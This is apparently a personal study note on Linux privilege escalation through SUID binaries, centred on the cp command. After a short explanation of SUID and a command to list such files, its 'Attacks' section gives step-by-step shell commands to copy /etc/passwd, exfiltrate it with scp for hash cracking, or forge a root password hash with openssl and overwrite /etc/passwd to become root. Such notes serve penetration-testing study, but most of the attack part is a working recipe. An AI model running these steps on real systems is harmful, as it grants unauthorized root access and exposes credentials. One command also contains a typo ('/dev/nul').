---
id: Linux Privilege Escalation with SUID files
tags: ["linux", "suid", "copy", "privilege escalation"]
created: 2023-01-12 11:56
---
# Linux Privilege Escalation with SUID files

backlinks: [[]]

sources:

- <https://medium.com/go-cyber/linux-privilege-escalation-with-suid-files-6119d73bc620>

- <https://steflan-security.com/linux-privilege-escalation-suid-binaries/>

---

SUID (Set owner User ID up on execution) is a special permission that allows other users run with the owner's privileges.

SUID will be set by adding number 4 in the permission number when using chmod command. For example: 4777, 4600, 4500, 4000, etc.

```shell
sudo chmod 4777 demo_file
```

To list all the SUID files in the system

```shell
find / -perm -u=s -type f 2>/dev/nul
```

## Attacks

### 1. cp (copy) command

Use the cp command to copy the /etc/passwd file into /tmp/passwd for modification or brute forcing

```shell
# where is cp
which cp

# modify the suid permissions
chmod u+s /usr/bin/cp

# copy the /etc/passwd file to /tmp/passwd
cp /etc/passwd /tmp/passwd

# output to shell
cat /tmp/passwd

```

you can now use [secure copy or scp](../../tools/scp.md) to exfil the /tmp/passwd file and try and brute force a hash

### OR

replace the current root's credentials in the /tmp/passwd file and then copy back to /etc/passwd

```shell

# create the encrypted password
openssl passwd -1 -salt thesalt password123     

$1$thesalt$166sDL4yX0wLQeuVfSLff1

# example root line from /tmp/passwd
root:x:0:0:root:/root:/bin/zsh

# replace the x with the output generated from the openssl command
root:$1$thesalt$166sDL4yX0wLQeuVfSLff1:0:0:root:/root:/bin/zsh

# copy the /tmp/passwd file back to /etc/passwd
cp /tmp/passwd /etc/passwd

#switch to root and use the password from above - password123
su

#confirm you are running as root
whoami

```
